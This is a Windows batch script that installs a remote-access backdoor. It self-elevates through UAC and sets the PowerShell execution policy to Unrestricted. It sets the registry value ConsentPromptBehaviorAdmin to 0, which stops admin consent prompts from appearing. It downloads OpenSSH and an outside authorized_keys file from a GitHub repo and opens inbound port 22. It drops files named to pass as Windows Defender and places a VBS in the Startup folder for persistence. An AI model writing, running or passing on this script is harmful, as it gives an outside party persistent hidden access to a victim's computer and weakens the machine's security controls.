@echo off 
:-------------------------------------
@echo off 
REM  --> Analizando los permisos
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

@echo off 
if '%errorlevel%' NEQ '0' (
@echo off 
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------  
::/Pro
PowerShell Set-ExecutionPolicy RemoteSigned -Force
PowerShell Set-ExecutionPolicy Unrestricted -Force
PowerShell Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value "0" 
PowerShell New-Item -Path c:\ -Name temp -ItemType Directory
PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mrx2709/srv/main/OpenSSH-Win64.zip','C:\temp\OpenSSH-Win64.zip')
PowerShell Expand-Archive -Path "c:\temp\OpenSSH-Win64.Zip" -DestinationPath "C:\ProgramData\OpenSSH"
PowerShell . "C:\ProgramData\OpenSSH\OpenSSH-Win64\install-sshd.ps1"
PowerShell New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
PowerShell Set-Service sshd -StartupType Automatic
PowerShell New-item -Path $env:USERPROFILE -Name .ssh -ItemType Directory -force
PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mrx2709/srv/main/authorized_keys','C:\%HoMePath%\.ssh\authorized_keys')
PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mrx2709/srv/main/Windows-Defender.zip','C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Windows-Defender.zip')
PowerShell Expand-Archive -Path "c:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Windows-Defender.Zip" -DestinationPath "C:\%HoMePath%\AppData\Roaming\Microsoft\Windows"
PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mrx2709/srv/main/WindowsSecurityDefender.vbs','C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityDefender.vbs')
PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mrx2709/srv/main/run.vbs','C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\run.vbs')
attrib -h -s -r C:\%HoMePath%\.ngrok2
attrib -h -s -r C:\%HoMePath%\.ssh
PowerShell Start-Service sshd
C:\%HoMePath%\AppData\Roaming\Microsoft\Windows\run.vbs
EXIT







                   





